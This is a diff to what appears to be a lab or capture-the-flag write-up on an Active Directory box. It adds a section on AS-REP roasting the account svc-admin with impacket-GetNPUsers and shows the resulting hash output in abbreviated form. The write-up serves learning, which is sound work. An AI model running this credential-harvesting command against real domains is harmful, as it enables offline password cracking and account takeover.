@@ -99,9 +99,29 @@ impacket-GetNPUsers -no-pass spookysec.local/ -usersfile userlist.txt -dc-ip 10.
 - `-format hashcat`: format any collected AS-REP cracking material for Hashcat.
 - `-outputfile asrep.txt`: save any collected AS-REP cracking material to this file.
 
+### Targeted Check: svc-admin
+
+Checking the entire `userlist.txt` was taking too long, so I switched to checking `svc-admin`, one of the valid usernames found with Kerbrute.
+
+```bash
+impacket-GetNPUsers spookysec.local/svc-admin -no-pass -dc-ip 10.146.158.66 -format hashcat -outputfile asrep.txt
+```
+
+Unlike the earlier command with `-usersfile`, this command targets a single account: `svc-admin`.
+
 ### Results
 
-> To add: the command output, any accounts found with pre-authentication disabled, and whether AS-REP cracking material was collected.
+The command returned AS-REP cracking material for `svc-admin`:
+
+```text
+[*] Getting TGT for svc-admin
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:<checksum>:<encrypted-data>
+```
+
+The checksum and encrypted data are abbreviated here for readability. The command uses `asrep.txt` as the output file for the full value.
+
+This confirms that `svc-admin` has Kerberos pre-authentication disabled. I obtained an AS-REP hash suitable for offline password cracking, not the plaintext password. Cracking has not yet been documented.
+
 
 ## What I Learned
 
